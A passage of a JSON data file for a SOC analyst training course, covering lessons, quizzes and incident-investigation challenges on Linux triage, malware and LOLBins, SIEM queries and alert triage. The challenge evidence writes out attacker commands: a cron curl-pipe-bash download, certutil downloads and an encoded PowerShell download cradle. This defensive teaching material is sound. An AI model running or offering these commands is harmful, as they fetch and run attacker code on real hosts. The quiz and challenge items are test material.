":"A cron entry runs: curl -s http://198.51.100.9/x.sh | bash every 5 minutes. What is its purpose?","o":["Log rotation","Persistence: re-downloading and running attacker code","Time sync","A backup"],"a":1,"why":"Download-and-execute on a schedule keeps the attacker's foothold even if the payload is removed."}],"chal":{"title":"web-prod-02 is slow","brief":"Ops reports 100% CPU on a web server. You were given three extracts. Copy them to a file and work in a terminal.","evidence":"# /var/log/auth.log - web-prod-02\nNov 13 02:11:03 web-prod-02 sshd[1811]: Failed password for root from 45.155.205.99 port 40122 ssh2\nNov 13 02:11:05 web-prod-02 sshd[1811]: Failed password for root from 45.155.205.99 port 40122 ssh2\nNov 13 02:11:08 web-prod-02 sshd[1813]: Failed password for root from 45.155.205.99 port 40130 ssh2\nNov 13 02:11:10 web-prod-02 sshd[1813]: Failed password for invalid user admin from 45.155.205.99 port 40130 ssh2\nNov 13 02:11:13 web-prod-02 sshd[1815]: Failed password for root from 45.155.205.99 port 40144 ssh2\nNov 13 02:11:15 web-prod-02 sshd[1815]: Failed password for invalid user test from 45.155.205.99 port 40144 ssh2\nNov 13 02:11:19 web-prod-02 sshd[1817]: Failed password for root from 45.155.205.99 port 40151 ssh2\nNov 13 02:11:22 web-prod-02 sshd[1817]: Failed password for deploy from 45.155.205.99 port 40151 ssh2\nNov 13 02:11:26 web-prod-02 sshd[1819]: Failed password for root from 45.155.205.99 port 40160 ssh2\nNov 13 02:11:31 web-prod-02 sshd[1821]: Accepted password for deploy from 45.155.205.99 port 40171 ssh2\nNov 13 02:11:31 web-prod-02 sshd[1821]: pam_unix(sshd:session): session opened for user deploy(uid=1001)\nNov 13 02:12:04 web-prod-02 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab -e\nNov 13 08:30:12 web-prod-02 sshd[2950]: Accepted publickey for ana from 10.0.0.8 port 51812 ssh2\n\n# crontab -l (root)\n*/5 * * * * curl -s http://45.155.205.99/x.sh | bash\n\n# ps aux (extract)\nroot      3120 97.4  3.1  /tmp/.kworker -o pool.minexmr.com:4444 --donate-level 1 --cpu-max-threads-hint 100","qs":[{"p":"Attacker's IP address","h":["ib39utc3ns"],"hint":""},{"p":"How many failed password attempts targeted root?","h":["1qzs2omomdx"],"hint":"Use grep -c"},{"p":"Which account did the attacker log in with?","h":["1s94rhdl1sh"],"hint":""},{"p":"Persistence mechanism used","h":["uke9uwldvh","1v8cebqktcr","d84aj6uwnl","m59w39olf8","rpzal80qgr"],"hint":"One word"},{"p":"What kind of malware is /tmp/.kworker?","h":["nxjcjb5n71","cyycge8pp","1r60z4004lj","1qn0hdg6k9r","1qzv476ohki","1ovc1itheq9","1bklbamzemc","itlbxykltb"],"hint":""}]},"iv":[["A Linux server is at 100% CPU. How do you investigate?","Check top or ps for the process, its path and user. A binary in /tmp or a deleted one is suspicious. Look at its network connections with ss, its parent, cron and systemd for how it starts, and auth.log for how the attacker got in."],["Where would you look for evidence of SSH compromise?","/var/log/auth.log or secure for failures followed by an accepted login, last and lastb, authorized_keys files for new keys, bash history, and new users in /etc/passwd."],["Write a one-liner to list the top IPs by failed SSH logins.","grep \"Failed password\" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head"]],"res":[["read","GTFOBins: how attackers abuse standard Linux binaries","https://gtfobins.github.io/","GTFOBins",20,1],["tool","explainshell: paste every one-liner from the cheat sheet and read the breakdown","https://explainshell.com/","explainshell.com",20,1],["video","Log analysis with grep, awk and sed","https://www.youtube.com/results?search_query=linux%20log%20analysis%20grep%20awk%20sed%20security%20auth.log%20tutorial","YouTube search",30,0],["read","Getting started with awk","https://www.gnu.org/software/gawk/manual/gawk.html#Getting-Started","GNU awk manual",30,0],["read","ATT&CK for Linux","https://attack.mitre.org/matrices/enterprise/linux/","MITRE",15,0],["practice","Bandit wargame, for speed on the command line","https://overthewire.org/wargames/bandit/","OverTheWire",60,0],["read","The Linux Command Line, free book: chapters on redirection, pipelines and text processing","https://linuxcommand.org/tlcl.php","William Shotts",90,0],["tool","tldr pages: practical examples for any command","https://tldr.sh/","tldr",10,0],["tool","crontab.guru: read any cron schedule","https://crontab.guru/","crontab.guru",5,0],["tool","regex101: build and test the patterns you grep with","https://regex101.com/","regex101",15,0]],"check":"I can list where Linux keeps auth logs and five live-triage commands without looking."},{"title":"Know your enemy's tools","module":"Malware concepts and threat intelligence","goal":"Classify malware by behaviour, recognise living-off-the-land binaries, and enrich an indicator with threat intelligence.","tasks":[["room","Malware Classification",1,"malwareclassification","Malware Concepts for SOC"],["room","Intro to Malware Analysis",1,"intromalwareanalysis","Malware Concepts for SOC"],["room","Living Off the Land Attacks",1,"livingoffthelandattacks","Malware Concepts for SOC"],["room","Shadow Trace",1,"shadowtrace","Malware Concepts for SOC"],["room","Intro to Cyber Threat Intel",1,"cyberthreatintel","Threat Analysis Tools"],["room","File and Hash Threat Intel",1,"fileandhashthreatintel","Threat Analysis Tools"],["room","IP and Domain Threat Intel",1,"ipanddomainthreatintel","Threat Analysis Tools"],["room","Invite Only",1,"invite-only","Threat Analysis Tools"],["own","Take three hashes from a public threat report, look them up on VirusTotal, and note family, first-seen date and contacted domains",1]],"lesson":"\u003cp>You do not reverse-engineer malware at L1. You do need to recognise what a process tree is telling you and to enrich an indicator in two minutes.\u003c/p>\n\u003ch4>Malware by goal\u003c/h4>\n\u003cul>\u003cli>\u003cb>Ransomware\u003c/b> encrypts for extortion. \u003cb>Infostealer\u003c/b> grabs credentials and cookies. \u003cb>RAT/backdoor\u003c/b> gives remote control. \u003cb>Loader/dropper\u003c/b> fetches the next stage. \u003cb>Miner\u003c/b> burns CPU. \u003cb>Worm\u003c/b> spreads by itself.\u003c/li>\u003c/ul>\n\u003ch4>Living off the land (LOLBins)\u003c/h4>\n\u003cpre>powershell -enc &lt;base64&gt;        encoded command (Base64 of UTF-16LE text)\ncertutil -urlcache -split -f     downloads a file\nmshta http://...                 runs remote HTA\nrundll32, regsvr32               proxy execution of DLLs and scripts\nbitsadmin /transfer              background download\nwmic process call create         remote or local execution\u003c/pre>\n\u003ch4>Suspicious parent and child\u003c/h4>\u003cp>Office apps (winword, excel, outlook) or browsers spawning cmd, powershell, wscript or mshta. See lolbas-project.github.io for the full list.\u003c/p>\n\u003ch4>Enrichment in 2 minutes\u003c/h4>\n\u003cpre>Hash    VirusTotal (search the hash; do not upload internal files)\nIP      AbuseIPDB, VirusTotal, whois/ASN\nDomain  registration age, passive DNS, urlscan.io\nDecode  echo BASE64 | base64 -d | iconv -f UTF-16LE -t UTF-8\n        or CyberChef: From Base64, then Decode text UTF-16LE\u003c/pre>\n\u003ch4>Common trap\u003c/h4>\u003cp>Zero detections on VirusTotal does not mean clean. Fresh or targeted samples start at zero.\u003c/p>","quiz":[{"q":"What distinguishes a worm from a trojan?","o":["A worm encrypts files","A worm spreads to other systems by itself","A worm needs a macro","There is no difference"],"a":1,"why":"Self-propagation defines a worm. A trojan relies on the user running it."},{"q":"What is a LOLBin?","o":["A leaked credential dump","A legitimate, usually signed system binary abused by attackers","A type of ransomware","A sandbox"],"a":1,"why":"Using built-in tools blends in with normal activity and avoids dropping new files."},{"q":"Why should you search a hash on VirusTotal instead of uploading the file?","o":["Uploading is slower","Uploaded files become available to others, which can leak company data or alert the attacker","Hashes give more detections","VirusTotal rejects files"],"a":1,"why":"Submissions are shared with the community and vendors."},{"q":"What does powershell.exe -enc followed by a long string indicate?","o":["A signed script","A Base64-encoded command, often used to hide intent","A PowerShell update","A remote desktop session"],"a":1,"why":"-enc (EncodedCommand) takes Base64 of UTF-16LE text."},{"q":"What is the difference between static and dynamic malware analysis?","o":["Static runs the sample; dynamic does not","Static inspects without running; dynamic executes it in a sandbox and observes","They are the same","Dynamic only reads strings"],"a":1,"why":"Static: hashes, strings, imports. Dynamic: behaviour while running."},{"q":"Which details help most when enriching a suspicious IP?","o":["Its colour in the SIEM","Reputation reports, owner/ASN, geolocation and passive DNS","The analyst's opinion","Its last octet"],"a":1,"why":"Context about who owns it and what it has done before guides the verdict."},{"q":"A file shows 0 of 70 detections on VirusTotal. What can you conclude?","o":["It is safe","Nothing certain; new or targeted malware often starts undetected","It is definitely malicious","The hash is wrong"],"a":1,"why":"Absence of detections is not evidence of safety. Look at behaviour and context."}],"chal":{"title":"Decode the process tree","brief":"EDR raised \"Office application spawned a shell\". Explain what ran. You will need to decode the PowerShell argument: base64 -d piped to iconv -f UTF-16LE, or CyberChef.","evidence":"# EDR process tree, host MKT-PC-03, user o.ceban, 2026-11-16\n14:07:11  explorer.exe (pid 2210)\n14:07:19   └─ WINWORD.EXE (pid 5120)  \"C:\\Users\\o.ceban\\Downloads\\Offer_Nov.docm\"\n14:07:40       └─ cmd.exe (pid 5388)  /c certutil.exe -urlcache -split -f http://91.92.240.15/a.txt C:\\Users\\Public\\a.exe\n14:07:41           └─ certutil.exe (pid 5402)  -urlcache -split -f http://91.92.240.15/a.txt C:\\Users\\Public\\a.exe\n14:07:58       └─ powershell.exe (pid 5466)  -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AOQAyAC4AMgA0ADAALgAxADUALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA=\n14:08:03  a.exe (pid 5510)  C:\\Users\\Public\\a.exe   sha256=9f2c1d7a4be0c35d81aa6f0e7b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e","qs":[{"p":"Which process started the malicious chain?","h":["rat7eg9dln","kpreqvp9a1","992goxdcil","14kh5amgpbb"],"hint":"Process name"},{"p":"Which LOLBin downloaded a.exe?","h":["9jtn4gbpdq","v5vb1678v7"],"hint":""},{"p":"Decode the PowerShell command. Which file does it fetch?","h":["10afo52fe29"],"hint":"File name only"},{"p":"ATT&CK technique ID for downloading tools from an external system (Ingress Tool Transfer)","h":["26kjfmtkpfv"],"hint":"T####"},{"p":"IP address you would hunt for across all other hosts","h":["tq31dmjhc8"],"hint":""}]},"iv":[["What is living off the land and why is it hard to detect?","Attackers use legitimate built-in tools such as PowerShell, certutil or rundll32, so there is no malicious file for antivirus to flag. Detection has to rely on context: unusual parent processes, command-line arguments and network connections."],["You have a suspicious file hash. What do you do with it?","Search it on VirusTotal and other intel sources without uploading the file, note the family and behaviour, then hunt for the hash and its related indicators across all endpoints to find the scope."],["Why is winword.exe spawning powershell.exe suspicious?","Office applications do not normally start a shell. It usually means a macro or exploit is executing code, which is a classic initial-access pattern."]],"res":[["read","LOLBAS: read the entries for certutil, mshta, rundll32 and regsvr32","https://lolbas-project.github.io/","LOLBAS Project",20,1],["tool","CyberChef: practise From Base64 followed by Decode text (UTF-16LE)","https://gchq.github.io/CyberChef/","GCHQ",15,1],["video","Deobfuscating malicious PowerShell","https://www.youtube.com/results?search_query=John%20Hammond%20powershell%20malware%20deobfuscation","John Hammond (YouTube search)",30,0],["tool","Hash, URL, domain and IP lookups","https://www.virustotal.com/","VirusTotal",10,0],["tool","IP reputation","https://www.abuseipdb.com/","AbuseIPDB",5,0],["tool","Malware samples and families by hash","https://bazaar.abuse.ch/","MalwareBazaar",10,0],["read","T1105 Ingress Tool Transfer","https://attack.mitre.org/techniques/T1105/","MITRE ATT&CK",10,0],["tool","Interactive malware sandbox with public reports","https://any.run/","ANY.RUN",20,0],["tool","Free automated malware analysis","https://www.hybrid-analysis.com/","Hybrid Analysis",15,0],["tool","Malicious URL database","https://urlhaus.abuse.ch/","URLhaus",5,0],["read","Malware family encyclopedia","https://malpedia.caad.fkie.fraunhofer.de/","Malpedia",15,0],["tool","Open threat intelligence pulses","https://otx.alienvault.com/","AlienVault OTX",10,0],["read","Threat groups and the techniques they use","https://attack.mitre.org/groups/","MITRE ATT&CK",15,0]],"check":"I can name five LOLBins with what each is abused for, and decode an -enc command."},{"title":"The analyst's cockpit","module":"SIEM, EDR and SOAR","goal":"Write basic Splunk SPL and Elastic KQL searches from memory and explain what EDR and SOAR add.","tasks":[["room","Introduction to EDR",1,"introductiontoedrs","Core SOC Solutions"],["room","Introduction to SIEM",1,"introtosiem","Core SOC Solutions"],["room","Splunk: The Basics",1,"splunk101","Core SOC Solutions"],["room","Elastic Stack: The Basics",1,"investigatingwithelk101","Core SOC Solutions"],["room","Introduction to SOAR",1,"soar","Core SOC Solutions"],["own","Rewrite five of this week's cheat-sheet searches for a different question (for example failed logons per user instead of per IP)",1]],"lesson":"\u003cp>In a real SOC you live in the SIEM. The SAL1 simulator also expects you to pivot between alerts and log searches under time pressure, so query fluency is worth points.\u003c/p>\n\u003ch4>What each tool does\u003c/h4>\n\u003cul>\u003cli>\u003cb>SIEM\u003c/b>: collects logs, normalises field names, correlates, alerts. Splunk, Elastic, Sentinel.\u003c/li>\n\u003cli>\u003cb>EDR\u003c/b>: records endpoint telemetry (processes, files, network) and can respond, for example isolate a host.\u003c/li>\n\u003cli>\u003cb>SOAR\u003c/b>: runs playbooks automatically: enrich, open ticket, block, notify.\u003c/li>\u003c/ul>\n\u003ch4>Splunk SPL\u003c/h4>\n\u003cpre>index=auth action=failure earliest=-24h\n| stats count by src_ip\n| where count > 5\n| sort -count\n\nindex=win EventCode=4625 | stats dc(user) as users by src_ip | where users > 20\nindex=web status=404 | top limit=5 src_ip\nindex=proxy | timechart span=1h sum(bytes_out) by src_ip\n... | table _time host user CommandLine\n... | dedup src_ip\u003c/pre>\n\u003cp>Filter first (index, time, field=value), transform after the pipe. It is faster and easier to read.\u003c/p>\n\u003ch4>Elastic KQL\u003c/h4>\n\u003cpre>event.code: 4625 and user.name: \"admin\"\nsource.ip: 203.0.113.0/24 and not http.response.status_code: 200\nprocess.parent.name: \"winword.exe\" and process.name: (\"cmd.exe\" or \"powershell.exe\")\nurl.path: *passwd*\u003c/pre>\n\u003ch4>Common trap\u003c/h4>\u003cp>Searching \"all time\". Always set the time window around the alert first, then widen.\u003c/p>","quiz":[{"q":"What is the core job of a SIEM?","o":["Blocking malware on endpoints","Collecting, normalising and correlating logs to produce alerts","Scanning for open ports","Encrypting disks"],"a":1,"why":"A SIEM centralises logs so that events from different sources can be searched and correlated."},{"q":"Which SPL search counts failed logins per source IP?","o":["index=auth action=failure | stats count by src_ip","index=auth | count failure","select count(*) from auth","index=auth action=failure | table"],"a":0,"why":"Filter first, then stats count by the grouping field."},{"q":"Where should index and time filters go in an SPL search?","o":["After the last pipe","At the start, before the first pipe","Inside stats","They are optional and irrelevant"],"a":1,"why":"Early filtering reduces the events every later command has to process."},{"q":"Which KQL finds failed Windows logons for the user admin?","o":["event.code: 4625 and user.name: \"admin\"","EventCode=4625 | user=admin","SELECT * WHERE code=4625","event.code == 4624"],"a":0,"why":"KQL uses field: value with and/or/not."},{"q":"What does EDR give you that classic antivirus does not?","o":["Signature updates","Recorded endpoint telemetry and response actions such as host isolation","A firewall","Email filtering"],"a":1,"why":"EDR lets you see the process tree and act on the host remotely."},{"q":"What is SOAR used for?","o":["Storing passwords","Automating response playbooks such as enrichment and containment","Capturing packets","Writing malware signatures"],"a":1,"why":"Security Orchestration, Automation and Response."},{"q":"What does log normalisation mean in a SIEM?","o":["Deleting old logs","Mapping different log formats to common field names","Compressing logs","Encrypting logs"],"a":1,"why":"Without it, src, source_ip and c-ip would need separate searches."}],"chal":{"title":"Run the search in your head","brief":"No SIEM needed. Read the events and work out what each search would return. Then build the same answers in a terminal with grep and awk to check yourself.","evidence":"# 24 events, 2026-11-15, already parsed by the SIEM\n10:00:03 index=web  src_ip=203.0.113.50 status=404 uri=/admin\n10:00:04 index=web  src_ip=203.0.113.50 status=404 uri=/wp-login.php\n10:00:05 index=web  src_ip=203.0.113.50 status=404 uri=/.env\n10:00:06 index=web  src_ip=203.0.113.50 status=404 uri=/phpmyadmin\n10:00:07 index=web  src_ip=203.0.113.50 status=200 uri=/login\n10:00:20 index=web  src_ip=198.51.100.7 status=200 uri=/\n10:00:41 index=web  src_ip=198.51.100.7 status=404 uri=/favicon.ico\n10:01:02 index=web  src_ip=192.0.2.14 status=200 uri=/pricing\n10:01:15 index=web  src_ip=192.0.2.14 status=404 uri=/old-page\n10:01:16 index=web  src_ip=192.0.2.14 status=404 uri=/old-page/img.png\n10:01:30 index=web  src_ip=203.0.113.50 status=404 uri=/backup.zip\n10:02:00 index=web  src_ip=198.51.100.7 status=200 uri=/contact\n10:03:01 index=auth user=admin src_ip=203.0.113.50 action=failure\n10:03:02 index=auth user=admin src_ip=203.0.113.50 action=failure\n10:03:03 index=auth user=admin src_ip=203.0.113.50 action=failure\n10:03:04 index=auth user=admin src_ip=203.0.113.50 action=failure\n10:03:05 index=auth user=admin src_ip=203.0.113.50 action=failure\n10:03:06 index=auth user=admin src_ip=203.0.113.50 action=failure\n10:03:09 index=auth user=admin src_ip=203.0.113.50 action=success\n10:04:10 index=auth user=maria src_ip=192.0.2.14 action=failure\n10:04:25 index=auth user=maria src_ip=192.0.2.14 action=success\n10:05:00 index=auth user=admin src_ip=10.0.0.8 action=failure\n10:05:12 index=auth user=admin src_ip=10.0.0.8 action=success\n10:06:40 index=auth user=ion src_ip=198.51.100.7 action=success","qs":[{"p":"Result of: index=web status=404 | stats count by src_ip | sort -count | head 1  (the IP)","h":["1vvo7gsw31e"],"hint":""},{"p":"Result of: index=auth action=failure user=admin | stats count","h":["2ebodv2t52"],"hint":"A number"},{"p":"Which external IP scanned for hidden paths and then brute-forced admin successfully?","h":["1vvo7gsw31e"],"hint":""},{"p":"SPL command you add after \"| stats count by src_ip\" to keep only rows with count above 5","h":["j7as4i7nfo","17d31lqibwn","2eu4qequ3dp","j2h6tw32nv","1ku2b6lblhd","1sba7wcwv5b"],"hint":"One command"},{"p":"One login came from an internal address and may be the real admin. Which IP?","h":["1yfknkjqeg8"],"hint":""}]},"iv":[["What is a SIEM and what are its limits?","It centralises and normalises logs, correlates them and raises alerts. It only sees what is logged and sent to it, depends on rule quality, and can drown analysts in false positives without tuning."],["Write a Splunk search for sources with more than 10 failed logins in the last hour.","index=auth action=failure earliest=-1h | stats count by src_ip | where count > 10 | sort -count"],["EDR, SIEM, SOAR: how do they work together?","EDR produces endpoint telemetry and can act on hosts. The SIEM correlates that with network, identity and cloud logs. SOAR automates the response steps, such as enrichment, ticketing and isolation."]],"res":[["read","Splunk Search Tutorial: parts 1 to 4","https://docs.splunk.com/Documentation/Splunk/latest/SearchTutorial/WelcometotheSearchTutorial","Splunk docs",45,1],["read","Kibana Query Language","https://www.elastic.co/guide/en/kibana/current/kuery-query.html","Elastic docs",15,1],["video","Splunk Tutorial for Beginners (Cyber Security Tools)","https://www.youtube.com/results?search_query=MyDFIR%20Splunk%20Tutorial%20for%20Beginners%20Cyber%20Security%20Tools","MyDFIR (YouTube search)",30,0],["read","SPL search command reference","https://docs.splunk.com/Documentation/Splunk/latest/SearchReference/","Splunk docs",15,0],["practice","Boss of the SOC datasets and challenges","https://bots.splunk.com/","Splunk",90,0],["video","Free Splunk courses, including Intro to Splunk","https://www.splunk.com/en_us/training/free-courses/overview.html","Splunk",120,0],["read","Ready-made Splunk detections to read and learn SPL from","https://research.splunk.com/","Splunk Threat Research",30,0],["read","Elastic detection rules","https://github.com/elastic/detection-rules","Elastic",20,0],["read","Kusto Query Language, used by Microsoft Sentinel","https://learn.microsoft.com/en-us/kusto/query/","Microsoft Learn",30,0],["read","Sigma rules: one detection, any SIEM","https://github.com/SigmaHQ/sigma","SigmaHQ",20,0]],"check":"I can write an SPL search with stats, where and sort, and a KQL query, from memory."},{"title":"Triage like a professional","module":"Alert triage, reporting and the SOC simulator","goal":"Take an alert from queue to closed with a correct verdict and a report another analyst can act on.","tasks":[["room","SOC L1 Alert Triage",1,"socl1alerttriage","SOC Team Internals"],["room","SOC L1 Alert Reporting",1,"socl1alertreporting","SOC Team Internals"],["room","SOC Workbooks and Lookups",1,"socworkbookslookups","SOC Team Internals"],["room","SOC Metrics and Objectives",1,"socmetricsobjectives","SOC Team Internals"],["room","Log Analysis with SIEM",1,"loganalysiswithsiem","SIEM Triage for SOC"],["room","Alert Triage With Splunk",1,"alerttriagewithsplunk","SIEM Triage for SOC"],["room","Alert Triage With Elastic",1,"alerttriagewithelastic","SIEM Triage for SOC"],["room","ItsyBitsy",1,"itsybitsy","SIEM Triage for SOC"],["room","Benign",1,"benign","SIEM Triage for SOC"],["thm","TryHackMe SOC Simulator: one full scenario, timed. Write a case report for every true positive",2]],"lesson":"\u003cp>Knowledge gets you the verdict. The report gets you the job. SAL1 gives case reports as many points as the whole multiple-choice section.\u003c/p>\n\u003ch4>Triage loop\u003c/h4>\n\u003cpre>1. Pick by severity, then age. Assign to yourself.\n2. Read the rule: what exactly did it match?\n3. Context: who is the user, what is the host, is this normal for them?\n4. Evidence: pivot in SIEM around the alert time (same host, user, IP).\n5. Verdict: true positive or false positive, with the reason.\n6. Act: close with comment, or escalate with everything L2 needs.\u003c/pre>\n\u003ch4>Report template (5 Ws)\u003c/h4>\n\u003cpre>Who    user and host affected, attacker IP or sender\nWhat   what happened, in one sentence, then the evidence\nWhen   first and last activity, in UTC\nWhere  systems and network segments involved\nWhy    why you judged it TP or FP\nThen   indicators, actions taken, recommended next steps\u003c/pre>\n\u003ch4>Metrics you will hear\u003c/h4>\u003cul>\u003cli>\u003cb>MTTD\u003c/b> mean time to detect, \u003cb>MTTA\u003c/b> to acknowledge, \u003cb>MTTR\u003c/b> to respond\u003c/li>\u003cli>\u003cb>False positive rate\u003c/b>: if it is high, tune the rule; do not ignore the queue\u003c/li>\u003c/ul>\n\u003ch4>Common trap\u003c/h4>\u003cp>Vague comments such as \"looks fine, closing\". Write what you checked and what you saw, so the next person does not have to repeat it.\u003c/p>","quiz":[{"q":"Five alerts are waiting. In which order should you take them?","o":["Newest first","Highest severity first, then oldest","Random","Lowest severity first to clear the queue"],"a":1,"why":"Severity and asset criticality drive priority; age breaks ties."},{"q":"What must a good alert closing comment contain?","o":["\"Closed\"","Who, what, when, where, why, the verdict and actions taken","Only the rule name","Your shift hours"],"a":1,"why":"The 5 Ws plus verdict make the case understandable without redoing the work."},{"q":"You confirm malware beaconing from a host but cannot isolate hosts yourself. What do you do?","o":["Close as false positive","Escalate to L2 with evidence and a recommended containment","Wait until the next shift","Email the user"],"a":1,"why":"A confirmed true positive that needs action outside your permissions is the definition of an escalation."},{"q":"What does MTTD measure?","o":["Mean time to deploy","Mean time to detect","Maximum time to defend","Mean ticket duration"],"a":1,"why":"How long malicious activity runs before it is detected."},{"q":"One rule produces 95% false positives. What is the right response?","o":["Disable it silently","Tune it: add exclusions or tighten conditions, and document the change","Ignore its alerts","Raise its severity"],"a":1,"why":"Tuning keeps coverage while reducing noise."},{"q":"A phishing alert names user ana. Thirty minutes later a suspicious logon alert fires for ana. What should you do?","o":["Handle them as unrelated","Link them: they are probably one incident","Close the second one","Delete both"],"a":1,"why":"Correlating by user, host and time turns separate alerts into an attack story."},{"q":"Why convert all timestamps to UTC when building a timeline?","o":["UTC is shorter to write","Sources log in different time zones, and mixing them corrupts the order of events","SIEMs require it by law","It hides the real time"],"a":1,"why":"A single reference time zone keeps the sequence correct across systems."}],"chal":{"title":"Four alerts, four verdicts","brief":"Give a verdict for each alert using the context provided: tp or fp. Then answer the last question.","evidence":"# Reference: Northwind asset and network list\nSSO portal            login.northwind.example            (official)\nCorporate VPN egress  185.60.112.10 (Frankfurt, DE)      (official)\nFIN-PC-07             finance workstation, user m.ionescu\nHR-PC-02              HR workstation, user e.lungu\n\nALERT 1  Suspicious link in email\n  Sender it-support@northwind.example, SPF pass, DKIM pass, DMARC pass\n  Link: https://login.northwind.example/reset   Recipients: all staff (password policy reminder)\n\nALERT 2  Office application spawned PowerShell\n  Host FIN-PC-07   excel.exe -> powershell.exe -nop -w hidden -enc SQBFAFgA...\n  30 seconds later: outbound HTTPS to 91.92.240.15 (first time seen in the company)\n\nALERT 3  Impossible travel\n  User e.lungu logged in from Chisinau, MD at 09:00 and from 185.60.112.10 at 09:05\n\nALERT 4  Anomalous DNS\n  Host HR-PC-02 sent 1,900 TXT queries in 10 minutes to *.sync-cdn-data.example\n  Subdomain labels are 48 random characters. Domain registered 2 days ago.","qs":[{"p":"Alert 1 verdict (tp/fp)","h":["i8u479f3ui","1394kq9z1r0"],"hint":""},{"p":"Alert 2 verdict (tp/fp)","h":["2c665p6cz9k","sd9ii4a5wh"],"hint":""},{"p":"Alert 3 verdict (tp/fp)","h":["i8u479f3ui","1394kq9z1r0"],"hint":""},{"p":"Alert 4 verdict (tp/fp)","h":["2c665p6cz9k","sd9ii4a5wh"],"hint":""},{"p":"ATT&CK tactic for what PowerShell is doing in Alert 2 at the moment it is launched","h":["28iloimmi2r"],"hint":"One word"},{"p":"What technique does Alert 4 describe?","h":["upv8ja4qxj","266ye96ivtg","1h10ukxa866","28g2gdhvncv","u1qxcqkjad","nic2geymc7"],"hint":"Two words"}]},"iv":[["How do you prioritise when several alerts arrive together?","By severity and by how critical the affected asset and user are, then by age. A medium alert on a domain controller can outrank a high one on a test machine."],["What goes into a good escalation?","A clear summary, the 5 Ws, a timeline in UTC, the evidence with queries used, indicators, what I already did, and what I recommend. L2 should not need to repeat my work."],["Tell me about a false positive and how you would reduce it.","For example a brute-force rule firing on a monitoring service account. I would confirm it is expected, then tune the rule with a narrow exclusion for that source and account, document it, and review the exclusion periodically."]],"res":[["read","SAL1 certification page: exam format and scoring","https://tryhackme.com/certification/security-analyst-level-1","TryHackMe",10,1],["read","One full intrusion report. Study how the timeline and findings are written","https://thedfirreport.com/","The DFIR Report",40,1],["video","SOC Core Skills course, pay what you can: alert triage sessions","https://www.antisyphontraining.com/product/soc-core-skills-with-john-strand/","Antisyphon, John Strand",120,0],["practice","Blue team investigation labs","https://cyberdefenders.org/blueteam-ctf-challenges/","CyberDefenders",90,0],["practice","SOC alert practice","https://letsdefend.io/","LetsDefend",60,0],["read","Incident response playbooks for phishing, password spray and app consent","https://learn.microsoft.com/en-us/security/operations/incident-response-playbooks","Microsoft Learn",30,0],["practice","Blue team investigations and challenges","https://blueteamlabs.online/","Blue Team Labs Online",90,0],["read","Traffic Light Protocol: how to label what you share","https://www.first.org/tlp/","FIRST",10,0]],"check":"I can recite the triage loop and the 5 Ws report template."},{"title":"Identity is the new perimeter","module":"Cloud and Active Directory for analysts","goal":"Read cloud audit logs and Kerberos events well enough to spot account takeover, privilege escalation and Kerberoasting.","tasks":[["thm","TryHackMe: start the \"Defending AWS\" path (first module, focus on IAM and CloudTrail)",3.5],["room","Active Directory Basics",1.5,"winadbasics","Extra room"],["own","Review events 4768, 4769 and 4776 in your notes and explain each aloud",0.5],["thm","TryHackMe SOC Simulator: second full scenario, timed. Compare your score with week 10",2]],"lesson":"\u003cp>Your long-term target is cloud security, and you marked cloud and AD as weak. One week will not make you an expert, but it covers what a SOC analyst is asked about them.\u003c/p>\n\u003ch4>Cloud basics\u003c/h4>\n\u003cul>\u003cli>\u003cb>Shared responsibility\u003c/b>: the provider secures the infrastructure; you secure identities, configuration and data.\u003c/li>\n\u003cli>\u003cb>IAM\u003c/b>: users, roles, policies. Least privilege always. Long-lived access keys are a liability.\u003c/li>\n\u003cli>\u003cb>Audit logs\u003c/b>: AWS CloudTrail, Azure Activity and Entra sign-in logs, GCP Cloud Audit Logs.\u003c/li>\u003c/ul>\n\u003ch4>CloudTrail events worth an alert\u003c/h4>\n\u003cpre>ConsoleLogin with MFAUsed=No from a new country\nCreateAccessKey, CreateUser, CreateLoginProfile      new credentials\nAttachUserPolicy / PutUserPolicy (AdministratorAccess) privilege escalation\nStopLogging, DeleteTrail                               covering tracks\nPutBucketPolicy / PutBucketAcl making S3 public        data exposure\nRunInstances of large GPU types in an unused region    crypto mining\u003c/pre>\n\u003ch4>Active Directory basics\u003c/h4>\n\u003cpre>Domain controller   holds accounts, issues Kerberos tickets\n4768   TGT requested (user authenticates to the domain)\n4769   service ticket requested for an SPN\n4776   NTLM credential validation\nKerberoasting   one account requests many service tickets with RC4\n                (encryption type 0x17), then cracks them offline\nPassword spray  one password tried across many accounts\nGolden ticket   forged TGT made with the krbtgt hash\u003c/pre>\n\u003ch4>Common trap\u003c/h4>\u003cp>Looking only at failed logins. In the cloud the dangerous event is often a successful login followed by quiet, legitimate-looking API calls.\u003c/p>","quiz":[{"q":"Under the shared responsibility model, what is always the customer's job?","o":["Physical data-centre security","Identity, access configuration and their own data","Hypervisor patching","Power and cooling"],"a":1,"why":"The provider secures the cloud; you secure what you put in it."},{"q":"Which AWS service records API calls made in an account?","o":["CloudWatch Metrics","CloudTrail","S3","Route 53"],"a":1,"why":"CloudTrail is the audit log of who did what, when and from where."},{"q":"What does least privilege mean?","o":["Everyone is admin for speed","Each identity gets only the permissions its task requires","Passwords under 8 characters","No one can log in"],"a":1,"why":"Fewer permissions mean less damage when an identity is compromised."},{"q":"What is Kerberoasting?","o":["Flooding the domain controller","Requesting service tickets for SPN accounts and cracking them offline","Stealing cookies","Guessing one password across many users"],"a":1,"why":"Any domain user can request the tickets; weak service account passwords fall to offline cracking."},{"q":"What does event ID 4768 show?","o":["A service was installed","A Kerberos TGT was requested","A user was deleted","The log was cleared"],"a":1,"why":"4768 is the TGT request; 4769 is a service ticket request."},{"q":"A user gets 30 MFA push prompts at night and finally approves one. What attack is this?","o":["MFA fatigue (push bombing)","Kerberoasting","SQL injection","ARP spoofing"],"a":0,"why":"The attacker already has the password and spams prompts until the user gives in."},{"q":"An S3 bucket with customer data is readable by anyone on the internet. How would you classify this?","o":["Expected behaviour","A misconfiguration causing data exposure","A DDoS attack","A Kerberos 